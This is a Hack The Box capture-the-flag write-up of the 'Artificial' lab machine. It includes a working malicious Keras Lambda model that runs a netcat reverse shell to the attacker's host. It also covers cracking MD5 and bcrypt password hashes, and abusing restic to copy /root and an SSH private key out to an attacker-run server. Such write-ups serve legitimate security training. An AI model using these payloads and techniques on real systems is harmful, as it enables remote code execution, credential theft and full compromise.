---
title: Hack The Box - Artificial (2025) Writeup
date: 2025-06-23 18:00:00
categories:
  - HackTheBox
  - Writeups
tags:
  - Artificial
  - TensorFlow
  - Docker
  - Linux
  - Privilege Escalation
  - restic
---

# Artificial (Hack The Box) - 2025

> "Sometimes, the best way to break an AI is to think like a human hacker."

---

## 1. Recon: The First Clues

It all started with a simple Nmap scan. The box, named **Artificial**, greeted me with two open ports:

```bash
nmap -sV -A artificial.htb
```

- **22/tcp**: OpenSSH 8.2p1
- **80/tcp**: Nginx 1.18.0, serving a site called "Artificial - AI Solutions"

> *Lesson: Always start with the basics. Every open port is a potential story.*

---

## 2. Web App & Dockerfile: Peeking Behind the Curtain

The website looked modern, but registration was open. After signing up, I found an upload page and, more interestingly, downloadable files: `Dockerfile` and `requirements.txt`.

The Dockerfile revealed the environment:
- Python 3.8
- TensorFlow CPU 2.13.1
- Bash as entrypoint

> *If you can reconstruct the target's environment, you can often reconstruct their mistakes.*

---

## 3. TensorFlow Lambda RCE: When AI Bites Back

Knowing TensorFlow was in play, I recalled past RCEs involving Lambda layers. I spun up a local Docker container to test my theory:

```dockerfile
FROM python:3.8-slim
WORKDIR /code
RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://...tensorflow_cpu-2.13.1...whl && \
    rm -rf /var/lib/apt/lists/*
RUN pip install ./tensorflow_cpu-2.13.1...whl
ENTRYPOINT ["/bin/bash"]
```

Then, I crafted a malicious model:

```python
import tensorflow as tf
import os

def exploit(x):
    os.system("rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc <your-ip> 6666 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

Uploaded `exploit.h5`, clicked "View Predictions," and... my netcat listener popped a shell. AI, meet human ingenuity.

---

## 4. From app to gael: Chasing Hashes

Inside the container as user `app`, I found a SQLite database:

```bash
cd ~/app/instance/
sqlite3 users.db
sqlite> SELECT * FROM user;
```

Dumped a hash, then cracked it with John:

```bash
echo "c9**********************" > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
```

Result: `gael : ***************`

---

## 5. Backups & Bcrypt: The sysadm Secret

As `gael`, I noticed I was in the `sysadm` group. In `/var/backups/`, a file `backrest_backup.tar.gz` was readable. Extracting it, I found a `config.json` with a bcrypt hash.

Cracked it with John (after base64 decoding):

```bash
echo "<hash>" | base64 -d > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
```

Result: `backrest_root : *******`

---

## 6. Port Forwarding: Opening the Inner Door

A service was listening on `127.0.0.1:9898`. I used SSH port forwarding to access it:

```bash
ssh gael@10.10.11.74 -L 9898:127.0.0.1:9898
```

---

## 7. restic: Backing Up the Root

The internal service was a rest-server. I started my own rest-server and used restic to back up `/root` from the victim:

**On attacker:**
```bash
./rest-server --path /tmp/restic-data --listen :7777 --no-auth
```

**On victim:**
```bash
restic -r rest:http://10.10.16.46:7777/myrepo init
restic -r rest:http://10.10.16.46:7777/myrepo backup /root
```

**On attacker:**
```bash
restic -r /tmp/restic-data/myrepo snapshots
restic -r /tmp/restic-data/myrepo restore <snapshot-id> --target ./restore
```

Inside the restored `/root` folder: `root.txt` and `id_rsa`.

---

## 8. Root: The Final Step

With the private key, I could SSH as root:

```bash
ssh -i ./id_rsa root@artificial.htb
```

Or just read the flag directly. Mission complete.

---

## Reflections

- **AI is only as secure as its weakest link.**
- **Docker isolation is not a silver bullet.**
- **Backups can be a goldmine for attackers.**

> "Every box is a puzzle, but every puzzle is a lesson."

---

*This writeup is for educational purposes only. Always hack responsibly.* 